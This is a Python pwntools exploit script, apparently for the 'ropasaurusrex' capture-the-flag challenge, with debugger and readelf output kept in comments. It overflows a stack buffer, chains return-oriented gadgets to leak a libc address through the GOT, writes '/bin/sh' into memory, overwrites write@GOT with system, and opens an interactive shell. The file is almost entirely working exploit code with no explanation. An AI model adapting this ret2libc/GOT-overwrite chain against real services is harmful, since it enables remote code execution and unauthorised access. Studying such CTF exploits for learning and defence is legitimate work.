from pwn import *

# gdb-peda$ p read
# $1 = {<text variable, no debug info>} 0xdbe90 <read>
# gdb-peda$ p write
# $2 = {<text variable, no debug info>} 0xdbf10 <write>
# gdb-peda$ p system
# $3 = {<text variable, no debug info>} 0x3e3e0 <system>
# gdb-peda$ p __libc_start_main
# $4 = {<text variable, no debug info>} 0x19970 <__libc_start_main>


# sudhakar@Hack-Machine:/tmp$ readelf -r ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 

# Relocation section '.rel.dyn' at offset 0x294 contains 1 entries:
#  Offset     Info    Type            Sym.Value  Sym. Name
# 08049600  00000106 R_386_GLOB_DAT    00000000   __gmon_start__

# Relocation section '.rel.plt' at offset 0x29c contains 4 entries:
#  Offset     Info    Type            Sym.Value  Sym. Name
# 08049610  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
# 08049614  00000207 R_386_JUMP_SLOT   00000000   write
# 08049618  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main
# 0804961c  00000407 R_386_JUMP_SLOT   00000000   read

s=remote('127.0.0.1',2323)
raw_input()
pad='A'*136+"BBBB"
#leak __libc_start_main : write GOT[__libc_start_main]=0x8049618 to stdout=1
payload=pad
payload+=p32(0x804830c)
payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
payload+=p32(1)
payload+=p32(0x8049618)
payload+=p32(4)

#read /bin/sh to 0x8049530 .dynamic      000000d0  08049530  08049530
payload+=p32(0x804832c)
payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
payload+=p32(0)
payload+=p32(0x8049530)
payload+=p32(7)

#read address from stdin=0 to GOT[write]
payload+=p32(0x804832c)
payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
payload+=p32(0)
payload+=p32(0x08049614)
payload+=p32(4)

payload+=p32(0x804830c)
payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
payload+=p32(0x8049530)
s.sendline(payload)

libc_leak=u32(s.recv(4))
print hex(libc_leak)
system=libc_leak-0x19970+0x3e3e0
print hex(system)

s.send("/bin/sh")# send /bin/sh to .dynamic write

s.send(p32(system))# overwrite GOT[write] with system

s.interactive()

